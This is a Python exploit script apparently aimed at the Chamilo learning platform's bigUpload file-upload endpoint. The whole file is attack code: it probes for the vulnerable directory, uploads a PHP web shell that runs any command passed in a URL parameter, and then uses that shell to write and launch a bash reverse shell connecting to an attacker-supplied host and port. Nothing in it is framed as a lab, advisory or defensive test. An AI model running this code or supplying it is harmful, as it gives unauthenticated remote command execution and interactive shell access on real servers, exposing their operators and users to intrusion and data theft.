import requests
from typing import Union


class ChamiloBigUploadExploit:
    def __init__(self, url: str) -> None:
        self.root_url = url.rstrip('/')
        self.check_url = f'{self.root_url}/main/inc/lib/javascript/bigupload/files/'
        self.vulnerable_endpoint = f'{self.root_url}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'


    @staticmethod
    def urlencode_all_characters(string: str) -> str:
        return ''.join(f'%{ord(char):02x}' for char in string)


    def check_target_vulnerable(self) -> bool:
        try:
            response = requests.get(self.check_url)
            return response.status_code == 200
        except requests.RequestException as e:
            print(f'Error checking vulnerability: {e}')
            return False

    
    def send_webshell(self, filename: str) -> Union[str, bool]:
        webshell_content = '<?php echo system($_GET["cmd"])?>'
        files = {'bigUploadFile': (filename, webshell_content)}

        try:
            response = requests.post(self.vulnerable_endpoint, files=files)
            if response.status_code == 200 and 'The file has successfully been uploaded.' in response.text:
                return f'{self.check_url}{filename}'
            return False
        except requests.RequestException as e:
            print(f'Error sending webshell: {e}')
            return False


    def send_and_execute_revshell(self, webshell_filename: str, bash_revshell_filename: str, host: str, port: int) -> bool:
        bash_revshell_content = f'#!/bin/bash\nbash -i >& /dev/tcp/{host}/{port} 0>&1'

        if not self.send_webshell(webshell_filename):
            return False

        commands = [
            f'echo -n "{bash_revshell_content}" > {bash_revshell_filename}',
            f'chmod +x {bash_revshell_filename}',
            f'bash {bash_revshell_filename}'
        ]

        for command in commands:
            urlencoded_command = self.urlencode_all_characters(command)
            try:
                response = requests.get(f'{self.check_url}{webshell_filename}?cmd={urlencoded_command}', timeout=5)
                if response.status_code != 200:
                    return False
            except requests.exceptions.ReadTimeout:
                pass
            except requests.RequestException as e:
                print(f'Error executing command: {e}')
                return False

        return True

